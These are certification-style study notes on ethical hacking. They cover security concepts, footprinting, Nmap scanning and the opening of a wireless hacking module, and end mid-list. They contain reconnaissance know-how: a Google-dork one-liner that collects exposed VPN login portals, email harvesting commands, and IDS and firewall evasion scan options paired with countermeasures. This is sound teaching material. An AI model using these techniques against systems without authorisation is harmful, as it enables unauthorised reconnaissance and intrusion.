# Certification

Notes de cours par `Thomas Peugnet` assisté par Mistral AI.

## Module 01 - Introduction

### 1. Elements of Information Security

- **Confidentiality**: Ensures that only authorized parties can access data.
- **Integrity**: Guarantees that information is accurate and unaltered.
- **Availability**: Ensures data and systems are accessible when needed.
- **Authenticity**: Verifies the genuineness of users and data.
- **Non-Repudiation**: Prevents parties from denying their actions or communications.

------

### 2. Tactics, Techniques, and Procedures (TTPs)

- **Definition**: TTPs refer to the patterns of activities or methods associated with a specific threat actor or group, detailing how they plan and execute an attack.

------

### 3. Classifications of Attacks

###### 3.1 Passive Attacks

- Examples:
  - Footprinting (gathering information about a target)
  - Sniffing (capturing network traffic)
  - Eavesdropping (listening to private communications)
  - Network Traffic Analysis (monitoring and analyzing traffic patterns)
  - Decryption of Weakly Encrypted Traffic (breaking weak encryption)

###### 3.2 Active Attacks

- Examples:
  - Spoofing Attacks (impersonating another identity)
  - Password-Based Attacks (guessing or cracking passwords)
  - Session Hijacking (taking over a legitimate session)
  - Denial-of-Service (DoS/DDoS) Attacks (overwhelming systems or networks)
  - Man-in-the-Middle (MITM) Attacks (intercepting communications)
  - SQL Injection (injecting malicious SQL queries)

###### 3.3 Closing Attacks

- **Definition**: Attempts to wrap up or finalize an attack phase, possibly erasing traces or leaving backdoors.

###### 3.4 Insider Attacks

- **Definition**: Attacks originating from within an organization by employees or trusted individuals.

###### 3.5 Distribution Attacks

- **Definition**: Attacks involving the distribution of malicious hardware or software (e.g., supply chain compromises).

------

### 4. CEH Ethical Hacking Framework

1. Phase 1 – Reconnaissance
   - Gathering initial information about the target through scanning, enumeration, and open-source intelligence.
2. Phase 2 – Vulnerability Scanning
   - Identifying vulnerabilities and weaknesses in the target’s systems or networks.
3. Phase 3 – Gaining Access
   - Exploiting identified vulnerabilities to obtain unauthorized access.
4. Phase 4 – Maintaining Access
   - Establishing persistence (e.g., backdoors) to retain ongoing control.
5. Phase 5 – Clearing Tracks
   - Covering evidence of compromise and malicious activity.

------

### 5. MITRE ATT&CK Framework

- **Purpose**: A knowledge base of adversary tactics and techniques based on real-world observations.

###### 5.1 Pre-Attack

- **Recon**: Gathering information about the target.
- **Weaponize**: Creating or customizing malicious payloads or exploits.

###### 5.2 Enterprise Attack

- **Deliver**: Sending the exploit or payload to the target (e.g., phishing).
- **Exploit**: Triggering the vulnerability to gain initial access.
- **Control**: Establishing command and control (C2) channels.
- **Execute**: Running malicious code or commands on the compromised system.
- **Maintain**: Ensuring continued access and persistence within the environment.

------

### 6. Continual Adaptive Security Strategy

- **Concept**: Continuous **prediction**, **prevention**, **detection**, and **response** to ensure comprehensive defense.

------

### 7. Defense In-Depth

A multi-layered approach where an attacker must penetrate each layer to reach the data:

| **Layer**                           | **Description**                                              |
| ----------------------------------- | ------------------------------------------------------------ |
| Policies, Procedures, and Awareness | Security policies, training, and user awareness.             |
| Physical                            | Locks, badges, security guards, physical barriers.           |
| Perimeter                           | Firewalls, intrusion detection systems (IDS), perimeter routers. |
| Internal Network                    | Network segmentation, internal firewalls, monitoring.        |
| Host                                | Endpoint protection, OS hardening, patch management.         |
| Application                         | Secure coding practices, application firewalls, input validation. |
| Data                                | Encryption, access controls, data loss prevention (DLP).     |

------

### 8. Risk

- Formula:

  - Risk = Threats × Vulnerabilities × Impact
  - Or Risk = Threat × Vulnerability × Asset Value

------

### 9. Risk Management

1. **Risk Identification**: Recognize potential threats and vulnerabilities.
2. **Risk Assessment**: Evaluate the likelihood and impact of each risk.
3. **Risk Treatment**: Decide on measures to mitigate, transfer, accept, or avoid the risks.
4. **Risk Tracking and Review**: Continuously monitor risks and reassess controls.

------

### 10. Types of Threat Intelligence

- **Strategic Threat Intelligence**: High-level, long-term insights into overall threat landscape.
- **Tactical Threat Intelligence**: Focused on immediate tactics and procedures used by attackers.
- **Operational Threat Intelligence**: Real-time intelligence on specific attacks or campaigns.
- **Technical Threat Intelligence**: Indicators of Compromise (IoCs) like IP addresses, domains, file hashes.

------

### 11. Threat Intelligence Lifecycle

1. **Planning and Direction**: Define goals and requirements for intelligence.
2. **Collection**: Gather data from internal and external sources.
3. **Processing and Exploitation**: Clean, organize, and convert collected data for analysis.
4. **Analysis and Production**: Interpret data to produce actionable intelligence.
5. **Dissemination and Integration**: Share intelligence with relevant stakeholders and apply it.

------

### 12. Threat Modeling

- **Definition**: Risk assessment approach to analyze application security by capturing and organizing information affecting security.

1. **Identify Security Objectives**
2. **Application Overview**
   - Identify Roles
   - Identify Key Usage Scenarios
   - Identify Technologies
   - Identify Application Security Mechanisms
3. **Decompose the Application**
   - Identify Threat Boundaries
   - Identify Data Flows
   - Identify Entry Points
   - Identify Exit Points
4. **Identify Threats**
5. **Identify Vulnerabilities**

------

### 13. Incident Handling and Response

1. **Preparation**: Policies, training, and tools in place before an incident occurs.
2. **Incident Recording and Assignment**: Document details and assign roles/responsibilities.
3. **Incident Triage**: Prioritize incidents based on severity and impact.
4. **Notification**: Inform stakeholders, management, or external parties as needed.
5. **Containment**: Stop the spread of the incident and isolate affected systems.
6. **Evidence Gathering and Forensic Analysis**: Collect data for analysis and potential legal action.
7. **Eradication**: Remove malware, close vulnerabilities, and eliminate root causes.
8. **Recovery**: Restore systems and services to normal operation.
9. **Post-Incident Activities**: Lessons learned, documentation, and improvements to defenses.

------

### 14. Machine Learning in Cybersecurity

**Key Areas of Use**

- Password Protection and Authentication
- Phishing Detection and Prevention
- Threat Detection
- Vulnerability Management
- Behavioral Analytics
- Network Security
- AI-Based Antivirus
- Fraud Detection
- Botnet Detection
- AI to Combat AI Threats

(*Supervised and unsupervised learning methods can be applied in these areas.*)

------

### 15. Relevant Laws and Regulations

Below is a brief overview of each regulation and its main focus:

| **Name**                                            | **Acronym** | **Purpose / Focus**                                          |
| --------------------------------------------------- | ----------- | ------------------------------------------------------------ |
| Payment Card Industry Data Security Standard        | PCI DSS     | Protects cardholder data through security controls and regular assessments. |
| ISO/IEC Standards (e.g., ISO/IEC 27001)             | ISO/IEC     | Provides guidelines and requirements for an information security management system (ISMS). |
| Health Insurance Portability and Accountability Act | HIPAA       | Secures and protects healthcare information and patient privacy in the U.S. |
| Sarbanes-Oxley Act                                  | SOX         | Ensures accurate financial reporting and corporate accountability for public companies in the U.S. |
| Digital Millennium Copyright Act                    | DMCA        | Protects copyright holders’ rights in the digital environment and addresses anti-circumvention of access controls. |
| Federal Information Security Management Act         | FISMA       | Requires federal agencies in the U.S. to develop, document, and implement information security programs. |
| General Data Protection Regulation                  | GDPR        | Regulates data protection and privacy for individuals within the EU; establishes strict data handling and breach notification rules. |
| Data Protection Act 2018                            | DPA         | UK-specific data protection legislation implementing and supplementing GDPR requirements. |

## Module 02 - Footprinting

### 1. Passive vs. Active Footprinting

- **Passive Footprinting**: Gathering information without directly interacting with the target (e.g., public websites, social media, open-source resources).
- **Active Footprinting**: Direct engagement with the target’s systems or networks (e.g., port scans, ping sweeps).

---

### 2. Information Obtained in Footprinting

- **Organization Information**: Company structure, employee names, addresses.
- **Network Information**: IP ranges, DNS details, connectivity methods.
- **System Information**: OS versions, server types, technology stacks.

> **Note**: Remember to check **page 10** of the module for the “Footprinting Techniques” table/graphic.

---

### 3. Search Engine Footprinting

#### 3.1 Google Search Operators

Below is a table of 30 commonly used Google operators (Google Dorks). These can help refine searches and find specific information about a target.

| Operator               | Syntax Example                  | Description                                                  |
| ---------------------- | ------------------------------- | ------------------------------------------------------------ |
| **1. site:**           | `site:example.com`              | Returns results only from the specified domain.              |
| **2. intitle:**        | `intitle:"login page"`          | Returns pages with the specified phrase in the HTML title.   |
| **3. allintitle:**     | `allintitle:admin site:gov`     | Returns pages where all keywords are in the title.           |
| **4. inurl:**          | `inurl:admin`                   | Returns pages with the specified keyword in the URL.         |
| **5. allinurl:**       | `allinurl:login.asp`            | Returns pages where all keywords are in the URL.             |
| **6. filetype:**       | `filetype:pdf "internal memo"`  | Returns files of a specific type containing the keywords.    |
| **7. link:**           | `link:example.com`              | Returns pages that link to the specified domain or URL.      |
| **8. related:**        | `related:example.com`           | Returns pages related to the specified domain or URL.        |
| **9. cache:**          | `cache:example.com`             | Shows the Google-cached version of the page.                 |
| **10. before:**        | `before:2020 "product launch"`  | Shows results published or updated before a specific year.   |
| **11. after:**         | `after:2021 "policy update"`    | Shows results published or updated after a specific year.    |
| **12. inanchor:**      | `inanchor:"click here"`         | Searches for pages with specified text in anchor links.      |
| **13. allinanchor**    | `allinanchor:"web login"`       | Searches for pages where all keywords appear in anchor text. |
| **14. intext:**        | `intext:"error message"`        | Searches for pages containing the specified text in the body. |
| **15. allintext:**     | `allintext:"username password"` | Searches where all words appear in the text body.            |
| **16. around(X)**      | `"admin" AROUND(5) "login"`     | Searches for terms within X words of each other.             |
| **17. "exact phrase"** | `"login portal"`                | Searches for the exact phrase in quotes.                     |
| **18. OR**             | `admin OR administrator`        | Combines multiple search terms; either may appear.           |
| **19. AND**            | `admin AND filetype:txt`        | Narrows search to results including both terms.              |
| **20. - (minus)**      | `login -wordpress`              | Excludes results containing the specified term.              |
| **21. + (plus)**       | `+pdf +internal`                | Ensures terms are included in results (less common today).   |
| **22. info:**          | `info:example.com`              | Provides information about the specified domain.             |
| **23. define:**        | `define:spear phishing`         | Displays Google’s definition of a term (varies by region).   |
| **24. map:**           | `map:"San Francisco"`           | Shows map results for a location (in some regions).          |
| **25. phonebook:**     | `phonebook:"John Doe"`          | (Deprecated) Used to look up phone listings.                 |
| **26. weather:**       | `weather:New York`              | Shows weather for a specific location.                       |
| **27. stocks:**        | `stocks:GOOG`                   | Returns stock information (in some regions).                 |
| **28. cacheurl:**      | `cacheurl:example.com`          | Alternate syntax to view cached pages.                       |
| **29. inposttitle:**   | `inposttitle:"vulnerability"`   | Searches in the post titles of forums or blog platforms (older). |
| **30. blogurl:**       | `blogurl:example.com`           | Might return blog URLs associated with a domain (less common usage). |

---

#### 3.2 Lynx (Command-Line Web Browser)

- **Purpose**: Text-based browsing; ideal for scripting and automation.
- **Basic Use**:  
  - `lynx https://example.com` (interactive mode: arrow keys to navigate, `q` to quit).
  - `lynx --dump https://example.com` (outputs page text and URLs to terminal).

**Recon Example**  

```bash
lynx --dump "http://www.google.com/search?q=inurl:%22remote+login%22+fortinet+OR+fortigate+OR+%22ss1+vpn%22" \
| grep "http" \
| cut -d "=" -f2 \
| grep -o "http[^&]*"
```

1. **lynx --dump**: Fetches Google search results for `inurl:"remote login"` + Fortinet/Fortigate/“ss1 vpn”.
2. **grep "http"**: Filters lines containing `http`.
3. **cut -d "=" -f2**: Splits each line on `=` and selects the second field.
4. **grep -o "http[^&]\*"**: Extracts clean URLs.

---

#### 3.3 Google Hacking Database (GHDB)

- Contains a collection of Google search queries (“dorks”) that reveal:
  - **Sensitive files** (e.g., configuration files, backup files).
  - **Exposed directories** (like `/admin/`, `/backup/`).
  - **Error messages** that may expose system paths or technologies.
  - **Vulnerable devices** (e.g., exposed webcams, printers).
- Can also be leveraged to find captive VPN or FTP portals through specialized dorks.

---

#### 3.4 Shodan

- A search engine that indexes internet-connected devices (IoT, servers, databases).
- Useful for discovering open ports, services, or known vulnerabilities on devices.

---

#### 3.5 Netcraft and DNSDumpster

- **Netcraft**: Gathers information about hosting providers, subdomains, technologies in use.
- **DNSDumpster**: Visual mapper of DNS records and subdomains of a domain.

---

### 4. Additional Tools and Techniques

#### 4.1 Cheat Sheet: `dig`

- **Basic query**:  
  - `dig example.com` – Default query for A record.
- **Specify DNS record**:  
  - `dig example.com MX` – Queries the MX records.
- **Reverse lookup**:  
  - `dig -x 8.8.8.8` – Finds the domain associated with an IP address.
- **Specify DNS server**:  
  - `dig @8.8.8.8 example.com` – Uses Google’s public DNS server.

#### 4.2 Blist3r

- A lesser-known tool for DNS enumeration and footprinting.
- Typical usage might involve commands like:  
  - `blist3r -domain example.com -mode scan`
- Offers quick enumeration of subdomains and potential vulnerabilities.

#### 4.3 Archive.org (Wayback Machine)

- Allows viewing of historical snapshots of websites (old content, removed pages, etc.).
- Useful for retrieving previously exposed information or older site structures.

---

### 5. Dark Web Footprinting

- Using **DuckDuckGo** as a Tor-friendly search engine.
- **DuckDuckDorks**: Similar to Google Dorks but focusing on `.onion` sites.
  - Example: Searching for leaked credentials, hidden services, or private forums.
  - Syntax is less standardized than Google Dorks; often uses keywords plus `site:.onion`.

---

### 6. Google Finance and Google Alerts

- **Google Finance**: Provides financial information about publicly traded companies (stock prices, historical data).
- **Google Alerts**: Sends email notifications when new results appear for specific keywords (e.g., company name, product, or competitor).

---

### 7. Gathering Information from LinkedIn

#### 7.1 TheHarvester

- A tool used to find email addresses and subdomains from different public sources (including LinkedIn).
- **Examples**:
  - `theharvester -d microsoft.com -l 200 -b linkedin`  
    Collects data from LinkedIn for the domain `microsoft.com`.
  - `theharvester -d example.com -l 100 -b all`  
    Uses all available search engines (Google, Bing, etc.) to gather info.

#### 7.2 BuzzSumo, Sherlock, SocialSearcher.com

- **BuzzSumo**: Discovers popular content and influencer information.  
- **Sherlock**: Finds usernames across multiple social networks.  
- **SocialSearcher.com**: Searches across various social media platforms for real-time mentions.

---

### 8. Whois

- Reveals domain registrant details (organization name, address, creation/expiration dates).
- May provide:
  - **Registrar** info,
  - **Contact** info (email/phone),
  - **Nameservers** used,
  - etc.

---

### 9. Extracting DNS Information

#### 9.1 Common DNS Record Types

| Record Type | Purpose                                             |
| ----------- | --------------------------------------------------- |
| **A**       | Maps a hostname to an IPv4 address                  |
| **AAAA**    | Maps a hostname to an IPv6 address                  |
| **MX**      | Mail Exchange record for email routing              |
| **NS**      | Nameserver record, indicates DNS servers for domain |
| **CNAME**   | Canonical name, alias for another domain name       |
| **SOA**     | Start of Authority, primary DNS server info         |
| **SRV**     | Service record for specific services (e.g., SIP)    |
| **PTR**     | Pointer record for reverse DNS lookups              |
| **RP**      | Responsible Person record (contact info)            |
| **HINFO**   | Host info (CPU/OS type) – often deprecated          |
| **TXT**     | Text record (SPF, DMARC, or other arbitrary data)   |

#### 9.2 Tools: SecurityTrails, FIRC

- **SecurityTrails**: Offers historical DNS data, subdomain enumeration, IP information.
  - Example usage: Searching historical records for `example.com`.

---

### 10. Network Footprinting

#### 10.1 Traceroute (TCP & UDP)

- **Default Traceroute (UDP)**:
  - `traceroute example.com` – Sends UDP packets, increments TTL to map hops.
- **TCP Traceroute**:
  - `tcptraceroute example.com 80` – Uses TCP packets on port 80 to bypass some firewalls.

#### 10.2 PingPlotter

- A graphical tool that combines ping and traceroute data for continuous route monitoring.

---

### 11. Tracking Email Communications

#### 11.1 Email Header Examination

Common details in an email header:

- **From/To/CC**: Sender and recipient email addresses.
- **Date/Subject**: Timestamp and email subject.
- **Message-ID**: Unique identifier for the email.
- **Received**: Shows the email’s path through mail servers (IP addresses, timestamps).
- **Content-Type**: Format of the email (text/html, etc.).

#### 11.2 Tools

- **Email Tracker Pro**: Tracks if/when emails are opened, recipient location, etc.
- **IP to Location**: Converts IP addresses found in headers to approximate geographic locations.

---

### 12. Physical / Social Engineering Footprinting

1. **Eavesdropping**: Listening to conversations or network traffic (e.g., open Wi-Fi).
2. **Shoulder Surfing**: Observing someone’s screen or keyboard to capture sensitive info.
3. **Dumpster Diving**: Retrieving documents or hardware from trash/recycling to find confidential data.
4. **Impersonation**: Pretending to be someone else (e.g., an employee, partner) to gain information or access.

## Module 03 - Network Scanning

### 1. TCP Communication Flags

| Flag | Meaning                                                 |
| ---- | ------------------------------------------------------- |
| SYN  | Initiate a connection (synchronize sequence numbers).   |
| ACK  | Acknowledge received data.                              |
| PSH  | Push data to the receiving application immediately.     |
| URG  | The data contained is urgent and should be prioritized. |
| FIN  | Gracefully close a connection (no more data to send).   |
| RST  | Immediately reset a connection.                         |

#### TCP 3-Way Handshake (Simplified)

1. Client → Server: Sends `SYN` (synchronize).
2. Server → Client: Replies with `SYN+ACK`.
3. Client → Server: Sends `ACK` to confirm.

When this handshake completes, the TCP session is considered established. A quick visual:

```
Client:  SYN --->    Server
Client:       <--- SYN+ACK  Server
Client:  ACK --->    Server
```

------

### 2. Quick Summary of Nmap & hping3

- Nmap: A powerful network scanner capable of host discovery, port scanning, OS detection, and more.
  - Official docs: https://nmap.org/book/man.html
- hping3: A TCP/IP packet assembler/analyzer for the command line. Often used to craft custom packets.
  - Official docs: https://github.com/antirez/hping

------

### 3. Common Port Reference (30 Well-Known Ports)

Here’s a quick table of 30 well-known ports, their protocols, and typical services:

| Port | Protocol | Service/Name       |
| ---- | -------- | ------------------ |
| 20   | TCP      | FTP (Data)         |
| 21   | TCP      | FTP (Control)      |
| 22   | TCP      | SSH                |
| 23   | TCP      | Telnet             |
| 25   | TCP      | SMTP (Mail)        |
| 53   | TCP/UDP  | DNS                |
| 67   | UDP      | DHCP (Server)      |
| 68   | UDP      | DHCP (Client)      |
| 69   | UDP      | TFTP               |
| 80   | TCP      | HTTP (Web)         |
| 110  | TCP      | POP3 (Mail)        |
| 111  | TCP/UDP  | RPCbind/Portmapper |
| 119  | TCP      | NNTP               |
| 123  | UDP      | NTP                |
| 135  | TCP/UDP  | Microsoft RPC      |
| 137  | UDP      | NetBIOS Name Svc   |
| 138  | UDP      | NetBIOS Datagram   |
| 139  | TCP      | NetBIOS Session    |
| 143  | TCP      | IMAP               |
| 161  | UDP      | SNMP               |
| 389  | TCP/UDP  | LDAP               |
| 443  | TCP      | HTTPS              |
| 445  | TCP      | SMB                |
| 631  | TCP/UDP  | IPP (Printing)     |
| 993  | TCP      | IMAPS (SSL IMAP)   |
| 995  | TCP      | POP3S (SSL POP3)   |
| 1433 | TCP      | MS SQL Server      |
| 3306 | TCP      | MySQL              |
| 3389 | TCP      | RDP                |
| 8080 | TCP      | HTTP Proxy         |

------

### 4. Basic Nmap Usage Examples

Below are some common scanning scenarios, along with the official flags. Keep in mind:

- `-sS`: SYN scan
- `-sA`: ACK scan
- `-sU`: UDP scan
- `-sn`: Host discovery only (no port scan)
- `-p <port>`: Specify the port (or port range)
- `-oG -`: Greppable output to standard out

#### 4.1. ICMP Ping (Host Discovery)

```bash
nmap -sn -PE <target>
```

- `-sn` (No port scan, just ping).
- `-PE` (ICMP echo request; capital ‘P’ stands for “Probe”, `E` = “Echo”).

#### 4.2. ACK Scan on Port 80

```bash
nmap -sA -p 80 <target>
```

- `-sA` sets the ACK scan mode.

#### 4.3. UDP Scan on Port 80

```bash
nmap -sU -p 80 <target>
```

- `-sU` sets the UDP scan mode.

#### 4.4. SYN Scan on Ports 50–60

```bash
nmap -sS -p 50-60 <target>
```

- `-sS` is the classic TCP SYN (“stealth”) scan.
- `-p 50-60` sets the port range to scan.

------

### 5. Saving Only Active Hosts to a File (Example)

Goal: “Scan the target network `10.10.1.0/24` for active hosts and place only the IP addresses into a file `scan1.txt`.”

Example (using `-sn` + `-oG` + `awk`):

```bash
nmap -sn 10.10.1.0/24 -oG - | awk '/Up$/{print $2}' > scan1.txt
```

- `-sn`: Ping scan only (no ports).
- `-oG -`: Greppable output sent to standard output.
- `awk '/Up$/{print $2}'`: Filters lines that end with “Up” and prints only the second field (the IP).

------

### 6. Nmap Parameter Naming Logic

- Lowercase vs. uppercase often indicates different types of probes or toggle behavior.

  - For example, `-sn` is “no port scan,” while `-S` with uppercase can mean “set a spoofed IP address” (under certain conditions).
  - `-PE` stands for “ICMP Echo” probe. The `P` in uppercase typically indicates a type of ping, followed by a letter for the specific method (E=Echo, N=NetBIOS, etc.).

- `-iL` = "input list" (lowercase “i” for input, uppercase “L” for "list").

------

### 7. Port Scanning Techniques

Nmap supports multiple scanning techniques. Below is a brief mention (we keep it minimal, as requested):

- TCP Scanning: Standard approach to detect open TCP ports (e.g., `-sS`, `-sT`, etc.).
- UDP Scanning: Checks UDP ports (e.g., `-sU`).
- SCTP Scanning: For SCTP endpoints (stream control transmission protocol); uses `-sY`, `-sZ` in some versions of Nmap.
- SSDP Scanning: Typically done by scanning UDP port 1900 or using scripts to find UPnP devices.
- IPv6 Scanning: Nmap supports IPv6 with the same syntax, just specify IPv6 addresses or `-6`.

#### 7.1. Inverse TCP Flag Scans

- Null Scan (`-sN`): Sends no flags.
- FIN Scan (`-sF`): Sends only FIN flags.
- Xmas Scan (`-sX`): Sends FIN+PSH+URG.

#### 7.2. Example: Inverse TCP Flag Scan Table

Below is a table with up to 10 popular scan types. The third column shows an official Nmap command that matches each scan if available.

| Scan Name    | Description                                                  | Nmap Command                         |
| ------------ | ------------------------------------------------------------ | ------------------------------------ |
| SYN Scan     | Stealthy scan that sends SYN packets and waits for responses (half-open). | `nmap -sS -p <port> <target>`        |
| Connect Scan | Uses the OS’s connect() call; fully established TCP sessions. | `nmap -sT -p <port> <target>`        |
| ACK Scan     | Sends ACK packets to map out firewall rules (open vs. filtered). | `nmap -sA -p <port> <target>`        |
| FIN Scan     | Sends FIN flags only to probe responses (inverse scan).      | `nmap -sF -p <port> <target>`        |
| NULL Scan    | Sends packets with no flags set.                             | `nmap -sN -p <port> <target>`        |
| Xmas Scan    | Sends FIN+PSH+URG. Often called “Christmas Tree” scan.       | `nmap -sX -p <port> <target>`        |
| Maimon Scan  | Rarely used; sends FIN/ACK to probe BSD-derived systems.     | `nmap -sM` *(Removed in newer Nmap)* |
| Window Scan  | Variation of ACK scan that checks window size to glean more info. | `nmap -sW -p <port> <target>`        |
| UDP Scan     | Checks for open UDP ports by sending UDP packets.            | `nmap -sU -p <port> <target>`        |
| SCTP Cookie  | SCTP-specific scanning method (cookie echo).                 | `nmap -sY -p <port> <target>`        |

### 8. OS Discovery with Nmap

Nmap can detect the OS of a target by analyzing TCP/IP stack behavior (e.g., TCP window sizes, Timestamps, and other fingerprintable traits).

- TCP Window Size: Different OSes respond with characteristic window sizes or modifications in the handshake.

- Nmap OS Detection Commands:

  1. `nmap -O <target>`: Enables OS detection (requires root privileges on most systems).
  2. `nmap -A <target>`: Enables OS detection, version detection, script scanning, and traceroute all together.
  3. `--osscan-limit` / `--osscan-guess`: Additional toggles to refine or guess OS results.
  4. Nmap Scripting Engine (NSE): Some scripts (e.g., `os-*`) can help identify OS details.

------

### 9. Scanning Beyond IDS and Firewalls

Various evasion or stealth techniques exist:

1. **Packet Fragmentation**

   - Sends tiny fragments to bypass simple signature-based IDS/IPS.

   - Nmap Option: `--mtu <val>` (e.g., `--mtu 16` to fragment packets).

   - > Countermeasure: Use reassembly at the perimeter (IDS/IPS that handles fragmented packets properly).

2. **Source Routing**

   - Embeds route information in packets to bypass certain network paths.

   - Modern systems often drop source-routed packets by default.

   - Nmap: The older option `--ip-options <RR|LSR|SSRR>` can set IP options, but real source routing is rarely fully supported in modern networks.

   - > Countermeasure: Disable source routing on routers and hosts.

3. **Source Port Manipulation**

   - Sets a common trusted port (e.g., 53 for DNS) to bypass firewall rules.

   - Nmap: `-g <port>` or `--source-port <port>`

   - > Countermeasure: Proper egress filtering and deep packet inspection to detect anomalies.

4. **IP Address Decoy**

   - Makes it appear that multiple decoy IPs are scanning the target along with your real IP.

   - Nmap: `-D <decoy1,decoy2,...,ME>` or `-D RND:10`

   - > Countermeasure: Correlate timing and packet patterns to see which host is the real scanner.

5. **IP Address Spoofing**

   - Fake source IP so replies go elsewhere (usually you can’t see open ports unless you receive the replies).

   - Nmap: `-S <IP>` is possible *if* you have raw socket privileges and are in an environment that won’t discard those packets.

   - > Countermeasure: Ingress filtering (RFC 2827), block private IPs at the perimeter.

6. **MAC Address Spoofing**

   - Changes the MAC address of your interface to bypass certain network filters or log correlation.

   - Nmap: 

     ```
     --spoof-mac <mac|0|vendor>
     ```

     - e.g. `nmap --spoof-mac Cisco <target>`

   - > Countermeasure: Port security on switches (e.g., sticky MAC) or use 802.1X.

7. **Creating Custom Packets**

   - Tools like hping3 let you craft packets with arbitrary flags, sequence numbers, etc.

   - hping3 example for a simple SYN on port 80:

     ```bash
     hping3 --syn -p 80 <target>
     ```

   - Countermeasure: Deep packet inspection, robust IPS.

8. **Randomizing Host Order**

   - Avoid scanning IP addresses in ascending order to look less suspicious.

   - Nmap: `--randomize-hosts`

   - > Countermeasure: Statistical traffic analysis to detect unusual patterns.

9. **Sending Bad Checksums**

   - Some IDS/IPS might ignore packets with invalid checksums, but the target OS may still process them.

   - Nmap: `--badsum` (listed in older docs; it’s a “TCP probe with a bogus TCP/UDP checksum”).

   - > Countermeasure: Proper normalization at the firewall or IDS that re-checks checksums and discards invalid packets.

10. **Proxy Servers and Anonymizers**

    - Use a chain of proxies, VPNs, or anonymity networks (e.g., Tor, Tails) to hide the true source of scans.

    - Nmap: Direct proxy usage is limited. Some scanning types do not work well over proxies.

    - > Countermeasure: Block known proxy/VPN IP ranges, use advanced correlation, or implement strong authentication.

------

#### 9.1. Anonymizers & Proxy-Chaining (Short Overview)

- Proxies: Single-hop intermediaries that forward traffic.
- Proxy-Chaining: Using multiple proxies in series to hide the origin.
- Types of Anonymizers:
  - Network-based: Tor, I2P, or corporate VPN solutions.
  - Single-Point: A single HTTP/SOCKS proxy.
  - Censorship Circumvention Tools: Tails (live OS with Tor), Astral VPN, etc.

------

### 10. Quick Countermeasures Reference

It helps to note potential defensive measures alongside each technique:

- Ping Sweep: Configure firewalls/routers to drop ICMP echo from untrusted networks, use IDS that detects unusual ICMP rates.
- ACK Scan: Employ stateful firewalls that detect non-standard ACK traffic.
- Xmas/Null/FIN Scans: IDS signatures or stateful inspection can detect these abnormal flag combinations.
- IP Spoofing: Use ingress/egress filtering (BCP 38) to stop non-routable or spoofed IP packets.
- MAC Spoofing: Implement port security (e.g., limit MAC addresses per port), or 802.1X for strict authentication.
- Decoys: Watch for timing correlation in logs.
- Packet Fragmentation: Use an IDS that reassembles fragments properly.
- Source Port Manipulation: Don’t rely solely on the source port for trust; use application-level verification.
- Bad Checksums: Use firewalls or IDS that properly validate checksums before forwarding.

## Module 16 - Hacking Wireless Networks

### 1. Core Wireless Terminology

| Term                                              | Technical Definition                                         |
| ------------------------------------------------- | ------------------------------------------------------------ |
| Global System for Mobile Communication (GSM)      | A worldwide standard for 2G cellular networks, primarily for voice and low-rate data transmissions. |
| Bandwidth                                         | The data transfer capacity of a connection, measured in bits per second (e.g., Mbps). Higher bandwidth supports more data throughput. |
| Access Point (AP)                                 | A networking device that creates a wireless local area network, often bridging wireless clients to a wired LAN. |
| Basic Service Set Identifier (BSSID)              | The unique MAC address of an AP. Identifies a specific radio on a given AP in a Wi-Fi network. |
| Industrial, Scientific, and Medical (ISM) Band    | Frequency bands allocated for non-commercial use (e.g., 2.4 GHz, 5 GHz), often exploited by Wi-Fi. |
| Hotspot Association                               | The process where a wireless client connects (associates) to a public (or private) wireless network (hotspot). |
| Service Set Identifier (SSID)                     | The network name broadcast by the AP. It can be hidden, but still discoverable via sniffing. |
| Orthogonal Frequency Division Multiplexing (OFDM) | A modulation method distributing data across multiple closely spaced subcarriers to reduce interference and improve efficiency. |

------

### 2. Types of Wireless Networks

1. Extensions to Wired Networks
   - Software AP (SAP): A device (e.g., laptop) configured via software to act as an AP.
   - Hardware AP: A dedicated hardware device designed as an AP.
   - Multiple Access Points: Several APs operating under the same SSID or extended network to increase coverage and balance loads.
2. LAN-to-LAN Wireless Networks
   - Used to link two separate LANs over a wireless bridge (e.g., point-to-point or point-to-multipoint bridging).

------

### 3. Wireless Standards (Common Examples)

| Standard | Frequency Band       | Max Theoretical Throughput | Key Characteristics                                          |
| -------- | -------------------- | -------------------------- | ------------------------------------------------------------ |
| 802.11b  | 2.4 GHz (ISM)        | 11 Mbps                    | Early widespread adoption, prone to interference, slower speeds. |
| 802.11g  | 2.4 GHz (ISM)        | 54 Mbps                    | Backward compatible with 11b, better throughput but same 2.4 GHz band. |
| 802.11n  | 2.4 GHz and/or 5 GHz | 150–600 Mbps (with MIMO)   | Introduced MIMO (multiple antennas), significantly improved speeds. |

------

### 4. SSID (Service Set Identifier)

- An SSID is the human-readable name of a wireless network (e.g., `MyOfficeWiFi`).
- Hidden SSID: Broadcasting can be disabled, but a determined attacker can discover it by capturing beacon frames or probe responses.

------

### 5. Wi-Fi Authentication Process

1. Preshared Key (PSK) Mode
   - Relies on a shared password known by the AP and clients (e.g., WPA2-PSK).
   - Common in home or small office environments.
2. Centralized Authentication Mode
   - Enterprise environment using a RADIUS or LDAP server (e.g., WPA2-Enterprise).
   - Individual credentials are verified centrally, improving security and manageability.

------

### 6. Wireless Encryption (Comparison Table)

| Protocol | Usage / Principle                        | Advantages                                                 | Limitations / Vulnerabilities                                |
| -------- | ---------------------------------------- | ---------------------------------------------------------- | ------------------------------------------------------------ |
| WEP      | Legacy encryption (RC4 with static key). | Easy to configure initially (historic).                    | Key easily cracked (IV-based attacks). Obsolete, insecure.   |
| WPA      | Successor to WEP (TKIP, RC4-based).      | Fixed some WEP flaws (per-packet key mixing).              | Still uses RC4/TKIP. Vulnerable to some exploits.            |
| WPA2     | Widely used standard (AES/CCMP).         | Robust security (AES), widely supported.                   | Weak passphrases can be brute-forced. WPS can be an attack vector. |
| WPA3     | Latest iteration (SAE key exchange).     | Stronger encryption, mitigates offline dictionary attacks. | Limited backward compatibility, requires modern hardware support. |

Additional:

- EAP/PEAP: Extensible authentication protocols (common in WPA-Enterprise).
- LEAP: Cisco proprietary, largely replaced by more secure EAP variants.
- RADIUS: Centralized authentication service for WPA2/WPA3-Enterprise.

------

### 7. Wireless Threats (Access Control Attacks, etc.)

- Access Control Attacks:
  - MAC Spoofing (impersonate a legitimate device).
  - AP Misconfiguration (weak creds, open APs).
  - SSID Broadcast (not inherently a security hole, but eases network discovery).
  - Weak Passwords / Config Errors.
  - Ad Hoc Associations.
  - Promiscuous Clients / Client Misassociation.
  - Unauthorized Association.

------

### 8. Wireless Hacking Methodology

1. Wi-Fi Discovery
   - Find available networks and their parameters (channel, security, BSSID, etc.).
2. Wireless Traffic Analysis
